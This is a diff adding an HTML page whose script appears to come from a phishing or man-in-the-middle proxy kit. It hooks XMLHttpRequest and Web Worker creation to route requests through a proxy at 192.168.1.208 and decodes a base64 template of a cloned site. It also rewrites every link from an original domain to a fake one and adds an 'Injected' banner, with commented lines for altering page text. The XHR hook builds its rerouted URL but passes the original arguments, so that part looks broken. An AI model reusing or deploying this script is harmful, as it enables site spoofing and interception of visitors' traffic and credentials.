@@ -1,0 +1,68 @@
+<script src="https://code.jquery.com/jquery-3.6.3.js"></script>
+<script src="https://cdn.tutorialjinni.com/jquery-xpath/0.3.1/jquery.xpath.js"></script>
+<script>
+
+var jq = jQuery.noConflict();
+var open = window.XMLHttpRequest.prototype.open
+var send = window.XMLHttpRequest.prototype.send;
+
+function openReplacement(method, url, async, user, password) {
+  this._url = url;
+  if(url.indexOf("_URL_") == -1) {
+  	url = "https://192.168.1.208?_URL_=" + encodeURIComponent(url)
+  }
+  return open.apply(this, arguments);
+}
+function sendReplacement(data) {
+  if(this.onreadystatechange) {
+    this._onreadystatechange = this.onreadystatechange;
+  }
+  this.onreadystatechange = onReadyStateChangeReplacement;
+  return send.apply(this, arguments);
+}
+function onReadyStateChangeReplacement() {
+  if(this._onreadystatechange) {
+    return this._onreadystatechange.apply(this, arguments);
+  }
+}
+
+window.XMLHttpRequest.prototype.open = openReplacement;
+window.XMLHttpRequest.prototype.send = sendReplacement;
+window._Worker = window.Worker
+window.Worker = function() { 
+	url = arguments[0]
+	if(url.indexOf("_URL_") == -1) {
+		url = "https://192.168.1.208?_URL_=" + encodeURIComponent(url)
+	}
+	return new window._Worker(url); 
+}
+
+var HTML = "{HTML}";
+var DOMAIN_ORIG = "{DOMAIN_ORIG}";
+var DOMAIN_FAKE = "{DOMAIN_FAKE}";
+
+jq(function(){
+	var html = atob(HTML)//.replaceAll('www.wix.com', '192.168.1.208')
+	//document.write( html )
+	//jq("body").html(html)
+	setTimeout(modify, 500)
+})
+
+function modify()
+{
+	jq.map(jq('a'), function(el) {
+		var link = jq(el).attr('href')
+	    if(link) {
+			jq(el).attr("href", link.replaceAll(DOMAIN_ORIG, DOMAIN_FAKE))
+		}
+	});
+
+	jq("html").prepend(jq("<div style='background:black; color:red; padding:5pt; width:100%; text-align:center; z-index:100; position:fixed'>Injected</div>"))
+	//jq(document).xpath('//*[@id="root"]/div/div[1]/div[1]/div[1]/a').remove()
+	//jq(document).xpath('//*[@id="root"]/div/div[1]/div[2]/div').remove()
+	//jq(document).xpath('//*[@id="comp-jcokrlux"]/h6/a/span/span').text("Mobiles from Anton GoodMan")
+}
+
+</script>
+
+<body></body>
